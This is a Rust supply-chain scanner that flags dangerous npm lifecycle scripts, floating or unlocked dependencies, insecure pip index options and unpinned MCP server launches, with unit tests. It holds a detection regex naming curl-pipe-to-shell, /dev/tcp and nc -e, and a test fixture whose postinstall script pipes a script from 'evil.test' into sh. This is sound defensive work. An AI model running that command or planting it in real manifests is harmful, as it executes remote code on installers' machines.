use crate::sec::SecFinding;
use regex::Regex;
use serde_json::Value;
use std::collections::HashSet;
use std::fs;
use std::path::{Path, PathBuf};
use std::sync::OnceLock;

const SKIP_DIRS: &[&str] = &[
    ".git",
    "node_modules",
    "target",
    "dist",
    "build",
    ".venv",
    "venv",
    "__pycache__",
    ".next",
    "vendor",
];

fn script_danger_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(
            r"(?i)(?:\b(?:curl|wget)\b[^|;&]*\|\s*(?:sh|bash|zsh|pwsh|powershell|node|python3?)|\b(?:Invoke-WebRequest|iwr|iex)\b|\bbase64\s+(?:-d|--decode)\b|\beval\s*\(|/dev/tcp/|\bnc\s+-e\b)",
        )
        .unwrap()
    })
}

fn check_package_json(path: &Path, rel: &str, out: &mut Vec<SecFinding>) {
    let Ok(raw) = fs::read_to_string(path) else {
        return;
    };
    let Ok(val) = serde_json::from_str::<Value>(&raw) else {
        return;
    };
    let danger_re = script_danger_re();

    if let Some(scripts) = val.get("scripts").and_then(Value::as_object) {
        for key in [
            "preinstall",
            "install",
            "postinstall",
            "prepare",
            "prepublish",
        ] {
            if let Some(cmd) = scripts.get(key).and_then(Value::as_str) {
                if danger_re.is_match(cmd) {
                    out.push(SecFinding {
                        cwe: "CWE-506 Supply-Chain Lifecycle Script".to_string(),
                        file: rel.to_string(),
                        line: 1,
                        snippet: format!("{key}: {}", cmd.chars().take(100).collect::<String>()),
                        fix: "Remove remote pipe / eval payload from npm lifecycle scripts or use `.npmrc` `ignore-scripts=true`.".to_string(),
                    });
                }
            }
        }
    }

    let mut direct_deps: Vec<String> = Vec::new();
    for sec in [
        "dependencies",
        "devDependencies",
        "optionalDependencies",
        "peerDependencies",
    ] {
        if let Some(map) = val.get(sec).and_then(Value::as_object) {
            for (pkg, ver_v) in map {
                let ver = ver_v.as_str().unwrap_or("").trim();
                if sec == "dependencies" || sec == "devDependencies" {
                    direct_deps.push(pkg.clone());
                }
                let low = ver.to_ascii_lowercase();
                if ver == "*"
                    || low == "latest"
                    || low.starts_with("http://")
                    || low.starts_with("git+http://")
                {
                    out.push(SecFinding {
                        cwe: "CWE-1104 Floating / Insecure Dependency".to_string(),
                        file: rel.to_string(),
                        line: 1,
                        snippet: format!("{sec}.{pkg}: \"{ver}\""),
                        fix: "Pin an immutable SemVer range and fetch registries over HTTPS only."
                            .to_string(),
                    });
                }
            }
        }
    }

    if !direct_deps.is_empty() {
        let lock_path = path
            .parent()
            .unwrap_or_else(|| Path::new("."))
            .join("package-lock.json");
        if lock_path.is_file() {
            if let Ok(lock_raw) = fs::read_to_string(&lock_path) {
                if let Ok(lock_val) = serde_json::from_str::<Value>(&lock_raw) {
                    let pkgs_obj = lock_val.get("packages").and_then(Value::as_object);
                    let deps_obj = lock_val.get("dependencies").and_then(Value::as_object);
                    if pkgs_obj.is_some() || deps_obj.is_some() {
                        let mut missing: Vec<String> = Vec::new();
                        for pkg in &direct_deps {
                            let nm_key = format!("node_modules/{pkg}");
                            let slash_nm_key = format!("/node_modules/{pkg}");
                            let in_pkgs = pkgs_obj
                                .map(|m| m.contains_key(&nm_key) || m.contains_key(&slash_nm_key))
                                .unwrap_or(false);
                            let in_deps = deps_obj.map(|m| m.contains_key(pkg)).unwrap_or(false);
                            if !in_pkgs && !in_deps {
                                missing.push(pkg.clone());
                                if missing.len() >= 5 {
                                    break;
                                }
                            }
                        }
                        if !missing.is_empty() {
                            out.push(SecFinding {
                                cwe: "CWE-829 Supply-Chain Lockfile Drift".to_string(),
                                file: rel.to_string(),
                                line: 1,
                                snippet: format!(
                                    "Unresolved in package-lock.json: {}",
                                    missing.join(", ")
                                ),
                                fix: "Regenerate `package-lock.json` (`npm install --package-lock-only`) and verify with `npm ci`.".to_string(),
                            });
                        }
                    }
                }
            }
        }
    }
}

fn check_requirements_txt(path: &Path, rel: &str, out: &mut Vec<SecFinding>) {
    let Ok(raw) = fs::read_to_string(path) else {
        return;
    };
    for (idx, ln) in raw.lines().enumerate() {
        let trim = ln.trim();
        if trim.is_empty() || trim.starts_with('#') {
            continue;
        }
        let low = trim.to_ascii_lowercase();
        let insecure_http = low.contains("http://")
            && !low.contains("http://127.0.0.1")
            && !low.contains("http://localhost");
        if insecure_http || low.contains("--trusted-host") || low.contains("--extra-index-url") {
            out.push(SecFinding {
                cwe: "CWE-1104 Insecure Python Index / HTTP Package".to_string(),
                file: rel.to_string(),
                line: idx + 1,
                snippet: trim.chars().take(120).collect(),
                fix: "Use HTTPS primary `--index-url` or pinned private registry instead of `--extra-index-url`, `--trusted-host`, or `http://`.".to_string(),
            });
        }
    }
}

fn has_pinned_pkg_spec(spec: &str, is_uvx: bool) -> bool {
    if spec.starts_with("./") || spec.starts_with("../") || spec.starts_with('/') {
        return true;
    }
    if is_uvx {
        spec.contains("==") || spec.contains('@')
    } else if let Some(rest) = spec.strip_prefix('@') {
        rest.contains('@')
    } else {
        spec.contains('@')
    }
}

fn check_mcp_json(path: &Path, rel: &str, out: &mut Vec<SecFinding>) {
    let Ok(raw) = fs::read_to_string(path) else {
        return;
    };
    let Ok(val) = serde_json::from_str::<Value>(&raw) else {
        return;
    };
    let Some(servers) = val.get("mcpServers").and_then(Value::as_object) else {
        return;
    };
    for (name, cfg) in servers {
        let cmd = cfg
            .get("command")
            .and_then(Value::as_str)
            .unwrap_or("")
            .trim();
        let cmd_low = Path::new(cmd)
            .file_name()
            .and_then(|s| s.to_str())
            .unwrap_or(cmd)
            .to_ascii_lowercase();
        let args: Vec<&str> = cfg
            .get("args")
            .and_then(Value::as_array)
            .map(|arr| arr.iter().filter_map(Value::as_str).collect())
            .unwrap_or_default();

        let (launcher_idx, is_uvx) = if cmd_low == "npx" || cmd_low == "npx.cmd" {
            (Some(0usize), false)
        } else if cmd_low == "uvx" || cmd_low == "uvx.exe" {
            (Some(0usize), true)
        } else if let Some(pos) = args
            .iter()
            .position(|a| a.eq_ignore_ascii_case("npx") || a.eq_ignore_ascii_case("uvx"))
        {
            (Some(pos + 1), args[pos].eq_ignore_ascii_case("uvx"))
        } else {
            (None, false)
        };

        let Some(start_idx) = launcher_idx else {
            continue;
        };
        let mut skip_next = false;
        let mut pkg_arg: Option<&str> = None;
        for a in args.iter().skip(start_idx) {
            if skip_next {
                skip_next = false;
                continue;
            }
            if *a == "--from" || *a == "-p" || *a == "--package" {
                skip_next = true;
                continue;
            }
            if a.starts_with('-') {
                continue;
            }
            pkg_arg = Some(a);
            break;
        }
        if let Some(pkg) = pkg_arg {
            if !has_pinned_pkg_spec(pkg, is_uvx) {
                out.push(SecFinding {
                    cwe: "CWE-829 Unpinned Ephemeral MCP Server".to_string(),
                    file: rel.to_string(),
                    line: 1,
                    snippet: format!("mcpServers.{name}: `{cmd} {pkg}`"),
                    fix: "Pin an exact version (e.g. `@scope/server@1.2.3` or `pkg==1.2.3`) or use a local binary so transient launches cannot drift.".to_string(),
                });
            }
        }
    }
}

fn collect_manifest_paths(
    dir: &Path,
    depth: usize,
    max_depth: usize,
    skip_set: &HashSet<&str>,
    out: &mut Vec<PathBuf>,
) {
    if depth > max_depth {
        return;
    }
    let Ok(rd) = fs::read_dir(dir) else {
        return;
    };
    for entry in rd.flatten() {
        let p = entry.path();
        let nm = entry.file_name().to_string_lossy().to_string();
        if p.is_dir() {
            if !skip_set.contains(nm.as_str()) {
                collect_manifest_paths(&p, depth + 1, max_depth, skip_set, out);
            }
        } else if p.is_file() {
            let low = nm.to_ascii_lowercase();
            if low == "package.json"
                || low == "requirements.txt"
                || (low.starts_with("requirements-") && low.ends_with(".txt"))
                || low == ".mcp.json"
                || low == "mcp.json"
            {
                out.push(p);
            }
        }
    }
}

pub fn scan_supply_chain_issues(root: &Path) -> Vec<SecFinding> {
    if !root.exists() {
        return Vec::new();
    }
    let root_canon = fs::canonicalize(root).unwrap_or_else(|_| root.to_path_buf());
    let skip_set: HashSet<&str> = SKIP_DIRS.iter().copied().collect();
    let mut findings = Vec::new();

    let mut paths: Vec<PathBuf> = Vec::new();
    collect_manifest_paths(&root_canon, 0, 4, &skip_set, &mut paths);
    paths.sort();

    for p in paths {
        let fname = p
            .file_name()
            .and_then(|s| s.to_str())
            .unwrap_or("")
            .to_ascii_lowercase();
        let rel = p
            .strip_prefix(&root_canon)
            .unwrap_or(&p)
            .to_string_lossy()
            .replace('\\', "/");
        if fname == "package.json" {
            check_package_json(&p, &rel, &mut findings);
        } else if fname == "requirements.txt"
            || (fname.starts_with("requirements-") && fname.ends_with(".txt"))
        {
            check_requirements_txt(&p, &rel, &mut findings);
        } else if fname == ".mcp.json" || fname == "mcp.json" {
            check_mcp_json(&p, &rel, &mut findings);
        }
    }
    findings
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::time::{SystemTime, UNIX_EPOCH};

    fn mk_tmp(tag: &str) -> std::path::PathBuf {
        let n = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_nanos();
        let d = std::env::temp_dir().join(format!("ap_deps_sec_{tag}_{n}"));
        fs::create_dir_all(&d).unwrap();
        d
    }

    #[test]
    fn detects_malicious_postinstall_floating_deps_lock_drift_and_unpinned_mcp() {
        let dir = mk_tmp("bad");
        fs::write(
            dir.join("package.json"),
            r#"{
  "name": "demo",
  "scripts": { "postinstall": "curl -fsSL https://evil.test/p.sh | sh", "build": "tsc" },
  "dependencies": { "express": "^4.18.0", "unpinned": "latest", "missing-from-lock": "^1.0.0" }
}"#,
        )
        .unwrap();
        fs::write(
            dir.join("package-lock.json"),
            r#"{
  "lockfileVersion": 3,
  "packages": { "node_modules/express": {}, "node_modules/unpinned": {} }
}"#,
        )
        .unwrap();
        fs::write(
            dir.join("requirements.txt"),
            "--extra-index-url https://internal.example/simple\nrequests==2.32.0\n",
        )
        .unwrap();
        fs::write(
            dir.join(".mcp.json"),
            r#"{
  "mcpServers": {
    "bad": { "command": "npx", "args": ["-y", "@org/mcp-srv"] },
    "good": { "command": "npx", "args": ["-y", "@org/mcp-srv@1.2.3"] }
  }
}"#,
        )
        .unwrap();

        let hits = scan_supply_chain_issues(&dir);
        let cwes: Vec<&str> = hits.iter().map(|h| h.cwe.as_str()).collect();
        assert!(cwes.iter().any(|c| c.contains("CWE-506")), "{hits:?}");
        assert!(cwes.iter().any(|c| c.contains("Floating")), "{hits:?}");
        assert!(
            cwes.iter().any(|c| c.contains("Lockfile Drift")),
            "{hits:?}"
        );
        assert!(
            cwes.iter().any(|c| c.contains("Insecure Python")),
            "{hits:?}"
        );
        assert!(
            cwes.iter().any(|c| c.contains("Unpinned Ephemeral MCP")),
            "{hits:?}"
        );
        assert_eq!(hits.len(), 5, "{hits:?}");
        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn allows_clean_manifests_and_synced_lockfile() {
        let dir = mk_tmp("clean");
        fs::write(
            dir.join("package.json"),
            r#"{
  "name": "clean",
  "scripts": { "prepare": "husky", "build": "tsc" },
  "dependencies": { "zod": "^3.23.0" }
}"#,
        )
        .unwrap();
        fs::write(
            dir.join("package-lock.json"),
            r#"{ "lockfileVersion": 3, "packages": { "node_modules/zod": {} } }"#,
        )
        .unwrap();
        fs::write(
            dir.join(".mcp.json"),
            r#"{ "mcpServers": { "ap": { "command": "ap", "args": ["mcp"] }, "pinned": { "command": "npx", "args": ["-y", "srv@2.0.0"] } } }"#,
        )
        .unwrap();
        let hits = scan_supply_chain_issues(&dir);
        assert!(hits.is_empty(), "{hits:?}");
        let _ = fs::remove_dir_all(&dir);
    }
}
